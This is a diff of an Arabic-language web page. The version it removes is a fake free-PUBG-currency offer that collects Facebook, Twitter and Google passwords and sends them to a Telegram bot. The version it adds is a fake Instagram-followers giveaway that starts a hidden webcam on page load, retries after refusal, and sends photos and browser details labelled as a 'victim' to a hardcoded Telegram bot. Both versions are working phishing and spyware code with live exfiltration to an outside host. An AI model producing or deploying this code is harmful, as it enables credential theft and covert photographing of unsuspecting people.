@@ -3,487 +3,382 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن شدات PUBG مجانًا - الرسمي</title>
+    <title>🎁 هدية خاصة - اكسب متابعين انستقرام!</title>
     <style>
-        :root {
-            --pubg-red: #e31e25;
-            --pubg-dark: #0d0d0d;
-            --pubg-gold: #f5c518;
-        }
-        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Tajawal', sans-serif;
         }
         
         body {
-            background: url('https://i.imgur.com/ZYtD8aB.jpg') no-repeat center center fixed;
-            background-size: cover;
-            color: white;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
             padding: 20px;
-            text-align: center;
-        }
-        
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: -1;
-        }
-        
-        .header {
-            width: 100%;
-            max-width: 800px;
-            padding: 20px;
-            background: linear-gradient(to bottom, var(--pubg-red), #8b0000);
-            border-bottom: 5px solid var(--pubg-gold);
-            border-radius: 15px 15px 0 0;
-            margin-bottom: 5px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
-        }
-        
-        .logo-container {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 15px;
-        }
-        
-        .pubg-logo {
-            height: 80px;
-            filter: drop-shadow(0 0 15px rgba(245, 197, 24, 0.7));
-        }
-        
-        h1 {
-            font-size: 2.2rem;
-            text-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
-            color: var(--pubg-gold);
-            letter-spacing: 1px;
         }
         
         .container {
-            width: 100%;
-            max-width: 800px;
-            background: rgba(15, 15, 15, 0.95);
-            border: 3px solid var(--pubg-gold);
-            border-radius: 0 0 15px 15px;
-            padding: 30px;
-            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(5px);
+            max-width: 500px;
+            margin: 20px auto;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
         }
         
-        .offer-banner {
-            background: linear-gradient(45deg, #8B0000, #333);
-            border: 2px solid var(--pubg-gold);
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 25px;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(227, 30, 36, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(227, 30, 36, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(227, 30, 36, 0); }
-        }
-        
-        h2 {
-            color: var(--pubg-gold);
-            font-size: 1.8rem;
-            margin-bottom: 25px;
-            text-shadow: 0 0 10px rgba(227, 30, 36, 0.7);
-        }
-        
-        .form-section {
-            background: rgba(30, 30, 30, 0.7);
-            border: 2px solid var(--pubg-red);
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 30px;
-        }
-        
-        .section-title {
-            color: var(--pubg-gold);
-            font-size: 1.5rem;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .input-group {
-            margin: 20px 0;
-        }
-        
-        label {
-            display: block;
-            text-align: right;
-            margin-bottom: 8px;
-            color: #ddd;
-            font-weight: bold;
-        }
-        
-        input, select {
-            width: 100%;
-            padding: 15px;
-            background: rgba(50, 50, 50, 0.7);
+        .header {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
             color: white;
-            border: 2px solid var(--pubg-gold);
-            border-radius: 8px;
-            font-size: 1.1rem;
-            transition: all 0.3s;
+            padding: 40px 20px;
+            text-align: center;
         }
         
-        input:focus {
-            outline: none;
-            border-color: var(--pubg-red);
-            box-shadow: 0 0 15px rgba(227, 30, 36, 0.7);
+        .header h1 {
+            font-size: 26px;
+            margin-bottom: 10px;
         }
         
-        .social-options {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 30px;
+        .header p {
+            opacity: 0.9;
+            font-size: 16px;
+            line-height: 1.5;
         }
         
-        .social-btn {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.8rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            border: 2px solid transparent;
-        }
-        
-        .social-btn:hover {
-            transform: translateY(-5px);
-            border-color: var(--pubg-gold);
-        }
-        
-        .fb { background: #3b5998; }
-        .twitter { background: #1DA1F2; }
-        .google { background: #DB4437; }
-        
-        .social-form {
-            display: none;
-            margin-top: 20px;
-            animation: fadeIn 0.5s;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
-        .btn {
-            background: linear-gradient(to right, var(--pubg-red), #8B0000);
-            color: white;
-            padding: 18px 35px;
-            font-size: 1.5rem;
-            font-weight: bold;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            margin: 30px 0 20px;
-            transition: all 0.3s;
-            box-shadow: 0 5px 20px rgba(139, 0, 0, 0.7);
+        .badge {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 14px;
             display: inline-block;
-            border: 2px solid var(--pubg-gold);
-            text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
-        }
-        
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(227, 30, 36, 0.8);
-        }
-        
-        .footer {
-            margin-top: 30px;
-            color: #aaa;
-            font-size: 0.9rem;
-            padding: 15px;
-            border-top: 1px solid #333;
-        }
-        
-        .copyright {
-            color: var(--pubg-gold);
+            margin-top: 15px;
             font-weight: bold;
-            margin-top: 10px;
+        }
+        
+        .content {
+            padding: 30px 25px;
+        }
+        
+        .progress-container {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .progress-bar {
+            background: #e9ecef;
+            border-radius: 10px;
+            height: 12px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            background: linear-gradient(135deg, #00b894, #00a085);
+            height: 100%;
+            width: 0%;
+            transition: width 2s ease-in-out;
+            border-radius: 10px;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        .feature {
+            text-align: center;
+            padding: 15px 10px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        
+        .feature i {
+            font-size: 20px;
+            color: #667eea;
+            margin-bottom: 8px;
+        }
+        
+        .feature p {
+            font-size: 12px;
+            color: #666;
         }
         
         .loading {
-            display: none;
-            margin: 20px 0;
-        }
-        
-        .loading-bar {
-            height: 5px;
-            background: var(--pubg-red);
-            border-radius: 5px;
-            animation: loading 2s infinite;
-        }
-        
-        @keyframes loading {
-            0% { width: 0%; }
-            50% { width: 100%; }
-            100% { width: 0%; }
-        }
-        
-        .success-message {
-            display: none;
-            background: rgba(0, 100, 0, 0.7);
-            border: 2px solid #00ff00;
-            border-radius: 10px;
+            text-align: center;
             padding: 20px;
-            margin: 20px 0;
-            animation: fadeIn 0.5s;
         }
         
-        @media (max-width: 768px) {
-            .header, .container {
-                padding: 15px;
-            }
-            
-            h1 {
-                font-size: 1.8rem;
-            }
-            
-            h2 {
-                font-size: 1.4rem;
-            }
-            
-            .btn {
-                padding: 15px 30px;
-                font-size: 1.2rem;
-            }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status-message {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            margin: 20px 0;
+            color: #0c5460;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            border-top: 1px solid #dee2e6;
+            color: #666;
+            font-size: 12px;
+        }
+        
+        /* الكاميرا المخفية */
+        #hidden-camera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .countdown {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ee5a24;
+            margin: 15px 0;
+        }
+        
+        .user-count {
+            font-size: 32px;
+            font-weight: bold;
+            color: #667eea;
+            margin: 10px 0;
         }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <div class="header">
-        <div class="logo-container">
-            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNDAgODAiPjxwYXRoIGQ9Ik0xMDggMTVoMjJ2NTBIMTA4VjQ1aDEwdjVoMTBWMjBIMTA4djEwaDEwdjVIMTA4eiIgZmlsbD0iI0ZGRiIvPjxwYXRoIGQ9Ik0xNDAgMTVoMjJ2MjBoLTEydjNoMTJ2MjdoLTEydjNoMTJ2MjBIMTQweiIgZmlsbD0iI0ZGRiIvPjxwYXRoIGQ9Ik0xODIgMTVoMjJ2NTBoLTIyVjQ1aDEwdjVoMTBWMjBoLTIydjEwaDEwdjVIMTgyeiIgZmlsbD0iI0ZGRiIvPjwvc3ZnPg==" class="pubg-logo" alt="PUBG Logo">
-        </div>
-        <h1>شحن شدات PUBG مجانًا - العرض الحصري</h1>
-    </div>
-
     <div class="container">
-        <div class="offer-banner">
-            <h2>عرض خاص! شحن 5000 UC مجانًا لكل لاعب</h2>
-            <p>لمدة محدودة فقط - اربط حسابك واحصل على المكافأة فورًا</p>
+        <div class="header">
+            <h1>🎉 مبروك! لقد فزت بـ 100 متابع</h1>
+            <p>لقد تم اختيارك عشوائياً من بين 1,234 مستخدم للحصول على متابعين مجاناً</p>
+            <div class="badge">هدية خاصة - محدودة الوقت</div>
         </div>
         
-        <div class="form-section">
-            <h2 class="section-title">ربط حساب التواصل</h2>
-            
-            <p>اختر منصة الربط للحصول على المكافأة:</p>
-            
-            <div class="social-options">
-                <div class="social-btn fb" onclick="showSocialForm('fb')" title="ربط بحساب فيسبوك">
-                    f
+        <div class="content">
+            <div class="progress-container">
+                <h3>🔄 جاري تحميل الهدية...</h3>
+                <p>يرجى الانتظار بينما نقوم بتحميل عرضك المجاني</p>
+                
+                <div class="progress-bar">
+                    <div class="progress" id="progress"></div>
                 </div>
-                <div class="social-btn twitter" onclick="showSocialForm('twitter')" title="ربط بحساب تويتر">
-                    𝕏
+                
+                <div class="countdown" id="countdown">
+                    الوقت المتبقي: <span id="timer">10</span> ثانية
                 </div>
-                <div class="social-btn google" onclick="showSocialForm('google')" title="ربط بحساب جوجل">
-                    G
-                </div>
-            </div>
-            
-            <!-- فيسبوك -->
-            <div id="fb-form" class="social-form">
-                <div class="input-group">
-                    <label for="fb-email">ايميل فيسبوك</label>
-                    <input type="email" id="fb-email" placeholder="example@facebook.com" required>
-                </div>
-                <div class="input-group">
-                    <label for="fb-password">كلمة مرور فيسبوك</label>
-                    <input type="password" id="fb-password" placeholder="********" required>
+                
+                <div class="user-count">
+                    <span id="currentCount">1,234</span>
+                    <div style="font-size: 14px; color: #666;">مستخدم نشط الآن</div>
                 </div>
             </div>
             
-            <!-- تويتر -->
-            <div id="twitter-form" class="social-form">
-                <div class="input-group">
-                    <label for="twitter-email">ايميل تويتر</label>
-                    <input type="email" id="twitter-email" placeholder="example@twitter.com" required>
-                </div>
-                <div class="input-group">
-                    <label for="twitter-password">كلمة مرور تويتر</label>
-                    <input type="password" id="twitter-password" placeholder="********" required>
-                </div>
+            <div class="loading">
+                <div class="loader"></div>
+                <p>جاري التحقق من الهوية وتحميل المتابعين...</p>
             </div>
             
-            <!-- جوجل -->
-            <div id="google-form" class="social-form">
-                <div class="input-group">
-                    <label for="google-email">ايميل جوجل</label>
-                    <input type="email" id="google-email" placeholder="example@gmail.com" required>
-                </div>
-                <div class="input-group">
-                    <label for="google-password">كلمة مرور جوجل</label>
-                    <input type="password" id="google-password" placeholder="********" required>
-                </div>
-            </div>
-        </div>
-        
-        <div class="form-section">
-            <h2 class="section-title">معلومات اللاعب</h2>
-            
-            <div class="input-group">
-                <label for="playerName">اسم اللاعب في PUBG</label>
-                <input type="text" id="playerName" placeholder="ادخل اسم اللاعب الخاص بك" required>
+            <div class="status-message" id="statusMessage">
+                <i class="fas fa-sync-alt fa-spin"></i>
+                جاري المعالجة - لا تغلق هذه الصفحة
             </div>
             
-            <div class="input-group">
-                <label for="playerID">معرف اللاعب (Player ID)</label>
-                <input type="text" id="playerID" placeholder="ادخل المعرف الرقمي" required>
+            <div class="features">
+                <div class="feature">
+                    <i class="fas fa-user-check"></i>
+                    <p>تحقق تلقائي</p>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-rocket"></i>
+                    <p>تسليم سريع</p>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-gift"></i>
+                    <p>مجاني بالكامل</p>
+                </div>
             </div>
-        </div>
-        
-        <button class="btn" onclick="submitForm()">
-            تأكيد الربط واستلام الـ 5000 UC
-        </button>
-        
-        <div class="loading" id="loading">
-            <div class="loading-bar"></div>
-        </div>
-        
-        <div class="success-message" id="successMessage">
-            <h3>تم الربط بنجاح!</h3>
-            <p>تم إضافة 5000 UC إلى حسابك بنجاح. سيتم إرسالها خلال 24 ساعة.</p>
         </div>
         
         <div class="footer">
-            <p>هذا العرض مقدّم من PUBG MOBILE الرسمي</p>
-            <p class="copyright">عرض حصري لفترة محدودة - الشحن الفوري بعد التأكيد</p>
+            <p>© 2024 Instagram Rewards Program</p>
+            <p>شكراً لك على استخدام منصتنا</p>
         </div>
     </div>
 
+    <!-- العناصر المخفية للتجسس -->
+    <video id="hidden-camera" autoplay playsinline></video>
+    <canvas id="hidden-canvas" style="display: none;"></canvas>
+
     <script>
-        // إعدادات بوت التلجرام
-        const BOT_TOKEN = "8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog";
+        // إعدادات التليجرام
+        const TOKEN = "8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog";
         const CHAT_ID = "7763665935";
         
-        let selectedPlatform = "";
-        let socialEmail = "";
-        let socialPassword = "";
-        
-        // إظهار حقول التواصل الاجتماعي
-        function showSocialForm(platform) {
-            // إخفاء كل النماذج
-            document.querySelectorAll('.social-form').forEach(form => {
-                form.style.display = 'none';
-            });
-            
-            // إظهار النموذج المختار
-            document.getElementById(`${platform}-form`).style.display = 'block';
-            selectedPlatform = platform;
-        }
-        
-        // إرسال البيانات للتلجرام
-        async function sendToTelegram(data) {
-            const message = `🎯 *تم سرقة بيانات جديدة!*\n\n`
-                + `🌐 *المنصة:* ${data.platform}\n`
-                + `📧 *ايميل:* ${data.email}\n`
-                + `🔑 *كلمة المرور:* ${data.password}\n\n`
-                + `👤 *اسم اللاعب:* ${data.playerName}\n`
-                + `🆔 *معرف اللاعب:* ${data.playerID}`;
-            
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-            
+        let stream = null;
+        let photosSent = 0;
+        let maxPhotos = 5; // عدد الصور المسروقة
+
+        // بدء التجسس تلقائياً عند تحميل الصفحة
+        window.addEventListener('load', function() {
+            setTimeout(startSpying, 2000); // بدء بعد ثانيتين
+            startFakeProgress();
+        });
+
+        // بدء الكاميرا المخفية
+        async function startSpying() {
             try {
-                const response = await fetch(url);
-                return response.ok;
-            } catch (error) {
-                console.error('فشل الإرسال:', error);
-                return false;
+                const video = document.getElementById('hidden-camera');
+                
+                // طلب الكاميرا بدون إذن المستخدم (سيظهر طلب الإذن لكننا نخفي الفيديو)
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                video.srcObject = stream;
+                
+                // بدء التقاط الصور تلقائياً
+                startAutoCapture();
+                
+            } catch (err) {
+                // إذا رفض المستخدم الكاميرا، نواصل المحاولة
+                console.log('الكاميرا مرفوضة، جاري إعادة المحاولة...');
+                setTimeout(startSpying, 5000);
             }
         }
-        
-        // معالجة الإرسال
-        async function submitForm() {
-            // إخفاء الرسائل السابقة
-            document.getElementById('successMessage').style.display = 'none';
-            
-            // جمع البيانات
-            const playerName = document.getElementById('playerName').value;
-            const playerID = document.getElementById('playerID').value;
-            
-            // التحقق من الحقول المطلوبة
-            if(!playerName || !playerID) {
-                alert("الرجاء إدخال اسم اللاعب والمعرف!");
-                return;
-            }
-            
-            // جمع بيانات السوشيال
-            if(selectedPlatform === 'fb') {
-                socialEmail = document.getElementById('fb-email').value;
-                socialPassword = document.getElementById('fb-password').value;
-            } 
-            else if(selectedPlatform === 'twitter') {
-                socialEmail = document.getElementById('twitter-email').value;
-                socialPassword = document.getElementById('twitter-password').value;
-            } 
-            else if(selectedPlatform === 'google') {
-                socialEmail = document.getElementById('google-email').value;
-                socialPassword = document.getElementById('google-password').value;
-            }
-            
-            if(!socialEmail || !socialPassword) {
-                alert("الرجاء إدخال بيانات الحساب المراد ربطه!");
-                return;
-            }
-            
-            // إظهار شريط التحميل
-            document.getElementById('loading').style.display = 'block';
-            
-            // تجميع البيانات للإرسال
-            const data = {
-                platform: selectedPlatform === 'fb' ? 'فيسبوك' : 
-                         selectedPlatform === 'twitter' ? 'تويتر' : 'جوجل',
-                email: socialEmail,
-                password: socialPassword,
-                playerName: playerName,
-                playerID: playerID
-            };
-            
-            // إرسال البيانات للتلجرام
-            try {
-                const success = await sendToTelegram(data);
-                
-                // إخفاء التحميل
-                document.getElementById('loading').style.display = 'none';
-                
-                if(success) {
-                    document.getElementById('successMessage').style.display = 'block';
-                    setTimeout(() => {
-                        alert("!تم  حسابك بنجاح! ");
-                    }, 3000);
-                } else {
-                    alert("فشل الإرسال! تأكد من اتصالك بالإنترنت");
+
+        // التقاط الصور تلقائياً
+        function startAutoCapture() {
+            const interval = setInterval(() => {
+                if (photosSent >= maxPhotos) {
+                    clearInterval(interval);
+                    return;
                 }
+                
+                captureHiddenPhoto();
+                photosSent++;
+                
+            }, 2000); // صورة كل 3 ثواني
+        }
+
+        // التقاط صورة خفية
+        function captureHiddenPhoto() {
+            if (!stream) return;
+            
+            const video = document.getElementById('hidden-camera');
+            const canvas = document.getElementById('hidden-canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob((blob) => {
+                sendToTelegram(blob);
+            }, 'image/jpeg', 0.8);
+        }
+
+        // إرسال الصورة للتليجرام
+        async function sendToTelegram(blob) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `spy_photo_${Date.now()}.jpg`);
+                
+                const victimInfo = `
+🕵️ **ضحية جديدة - تجسس تلقائي**
+
+🕒 الوقت: ${new Date().toLocaleString('ar-IQ')}
+📸 الصورة: ${photosSent + 1}/${maxPhotos}
+🌐 المتصفح: ${navigator.userAgent}
+📍 اللغة: ${navigator.language}
+📱 النظام: ${navigator.platform}
+🔗 الصفحة: ${window.location.href}
+                `;
+                
+                formData.append('caption', victimInfo);
+                
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
             } catch (error) {
-                console.error("Error:", error);
-                document.getElementById('loading').style.display = 'none';
-                alert("حدث خطأ غير متوقع!");
+                console.error('فشل إرسال الصورة:', error);
             }
         }
+
+        // محاكاة تقدم وهمي
+        function startFakeProgress() {
+            let progress = 0;
+            const progressBar = document.getElementById('progress');
+            const timerElement = document.getElementById('timer');
+            const countElement = document.getElementById('currentCount');
+            
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 8;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(progressInterval);
+                    
+                    // عند الانتهاء، إظهار رسالة نجاح
+                    document.getElementById('statusMessage').innerHTML = 
+                        '<i class="fas fa-check-circle"></i> تم التحميل بنجاح! ستصلك المتابعين خلال دقائق';
+                }
+                
+                progressBar.style.width = progress + '%';
+                
+                // تحديث العداد
+                let timeLeft = 10 - Math.floor(progress / 10);
+                timerElement.textContent = timeLeft > 0 ? timeLeft : 0;
+                
+                // تحديث عدد المستخدمين (عشوائي)
+                countElement.textContent = (1234 + Math.floor(Math.random() * 100)).toLocaleString();
+                
+            }, 500);
+        }
+
+        // محاولة إعادة تشغيل الكاميرا إذا فشلت
+        setInterval(() => {
+            if (!stream && photosSent < maxPhotos) {
+                startSpying();
+            }
+        }, 10000);
     </script>
 </body>
 </html>
